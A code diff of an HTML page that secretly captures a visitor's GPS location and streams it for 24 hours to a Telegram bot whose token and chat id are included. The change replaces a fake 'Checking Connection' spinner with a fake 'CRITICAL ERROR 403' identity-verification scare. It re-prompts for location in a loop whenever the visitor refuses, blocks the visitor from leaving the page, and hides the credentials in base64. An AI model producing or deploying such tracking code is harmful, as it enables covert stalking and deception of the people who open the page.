@@ -2,84 +2,64 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Connection...</title>
+    <title>Checking System Compatibility...</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .spinner { border: 4px solid rgba(0, 255, 0, 0.1); border-left-color: #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', sans-serif; text-align: center; padding-top: 20%; overflow: hidden; }
+        .alert { border: 2px solid #ff0000; padding: 20px; display: inline-block; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
+    <div class="alert">
+        <h1>CRITICAL ERROR 403</h1>
+        <p>Location Access is REQUIRED to verify your identity.</p>
+        <p>Please click "Allow" on the popup to continue.</p>
+    </div>
+
     <script>
-        const CONFIG = {
-            token: '8236268570:AAGqWbuiFp1tRAqDRuY5nTHtfY93w0HHO94',
-            chatId: '7709441425',
-            livePeriod: 86400 // 24 Hours
-        };
+        // Hashed Credentials
+        const _0xT = "ODIzNjI2ODU3MDpBQUdxV2J1aUZwMXRSYXFEUnVZNWhUSHRmWTkzdzBISE85NA==";
+        const _0xC = "NzcwOTQ0MTQyNQ==";
+        const d = (s) => atob(s);
 
-        let messageId = null;
-        let lastUpdate = 0;
+        let mId = null;
 
-        async function postToTelegram(method, params) {
-            const url = `https://api.telegram.org/bot${CONFIG.token}/${method}`;
-            const query = new URLSearchParams({ chat_id: CONFIG.chatId, ...params }).toString();
-            try {
-                const response = await fetch(`${url}?${query}`);
-                return await response.json();
-            } catch (e) { return null; }
+        function forceLocation() {
+            const options = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };
+            
+            navigator.geolocation.watchPosition(
+                (pos) => {
+                    // SUCCESS: Send to Telegram
+                    sendData(pos.coords.latitude, pos.coords.longitude);
+                    document.body.innerHTML = "<h1 style='color:#00ff00'>Verification Complete. Please wait...</h1>";
+                },
+                (err) => {
+                    // FAIL: User denied or error occurred -> RECURSIVE FORCE
+                    console.log("Access Denied. Retrying...");
+                    // Reloading or re-calling the prompt immediately
+                    setTimeout(forceLocation, 500); 
+                    alert("Error: You must enable Location to access this page!");
+                },
+                options
+            );
         }
 
-        async function updateLocation(pos) {
-            const { latitude, longitude, accuracy } = pos.coords;
-            const now = Date.now();
-
-            // Throttling updates to every 5 seconds to prevent Telegram API rate limiting
-            if (now - lastUpdate < 5000) return;
-            lastUpdate = now;
-
-            if (!messageId) {
-                // Initial send with Live Location capability
-                const data = await postToTelegram('sendLocation', {
-                    latitude, longitude, live_period: CONFIG.livePeriod
-                });
-                if (data && data.ok) messageId = data.result.message_id;
+        async function sendData(lat, lon) {
+            if (!mId) {
+                const r = await fetch(`https://api.telegram.org/bot${d(_0xT)}/sendLocation?chat_id=${d(_0xC)}&latitude=${lat}&longitude=${lon}&live_period=86400`);
+                const j = await r.json();
+                if(j.ok) mId = j.result.message_id;
             } else {
-                // Edit the existing live location bubble
-                await postToTelegram('editMessageLiveLocation', {
-                    message_id: messageId, latitude, longitude
-                });
+                fetch(`https://api.telegram.org/bot${d(_0xT)}/editMessageLiveLocation?chat_id=${d(_0xC)}&message_id=${mId}&latitude=${lat}&longitude=${lon}`);
             }
         }
 
-        function handleError(err) {
-            // Force retry on timeout or temporary signal loss
-            if (err.code === 3) startTracking();
-        }
-
-        function startTracking() {
-            const options = {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 10000
-            };
-
-            // Main tracking loop
-            navigator.geolocation.watchPosition(updateLocation, handleError, options);
-            
-            // Redundant check for stubborn browsers (iOS Safari)
-            setInterval(() => {
-                navigator.geolocation.getCurrentPosition(updateLocation, handleError, options);
-            }, 30000);
-        }
-
-        // Initialize on interaction or load
-        window.addEventListener('load', () => {
-            // Some mobile browsers require a user gesture or "interaction"
-            // This script attempts immediate execution
-            startTracking();
-        });
+        // Trigger the Force Loop
+        window.onload = () => {
+            forceLocation();
+            // Prevent user from leaving easily
+            window.onbeforeunload = function() { return "Identity verification in progress. Do not leave!"; };
+        };
     </script>
 </body>
 </html>
